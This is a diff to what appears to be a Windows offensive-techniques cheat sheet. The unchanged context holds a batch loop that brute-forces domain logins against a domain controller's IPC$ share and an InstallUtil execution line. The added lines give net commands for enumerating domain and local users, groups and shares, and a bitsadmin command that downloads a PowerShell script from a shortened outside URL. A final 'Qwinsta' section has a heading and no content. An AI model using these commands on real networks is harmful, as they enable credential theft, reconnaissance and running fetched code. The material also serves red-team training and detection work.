@@ -19,6 +19,35 @@ For loop:
 
     @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
 
+## Reconnaissance
+
+### Net user and group Enumeration
+
+Domain Group Enumeration:
+
+    net groups "domain administrators" /domain
+
+Domain User Enumeration:
+
+    net user <username> /domain
+
+Local Group Enumeration:
+
+    net localgroup "administrators"
+
+Local User Enumeration:
+
+    net user
+
+Local Share Enumeration:
+
+    net Share
+
+Remote Share Enumeration:
+
+    net share 
+
+
 ## at.exe
 
 Note: deprecated in Windows 8+
@@ -177,11 +206,8 @@ Input:
 
 Input:
 
-    code here
+    bitsadmin.exe  /transfer /Download http://bit.ly/L3g1tCrad1e Default_File_Path.ps1
 
-Output:
-
-    code here
 
 ## Installutil.exe
 
@@ -194,3 +220,7 @@ Input for pshell.dll:
 Input for rwxhunter.exe:
 
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U rwxhunter.exe
+
+## Qwinsta
+
+Input:
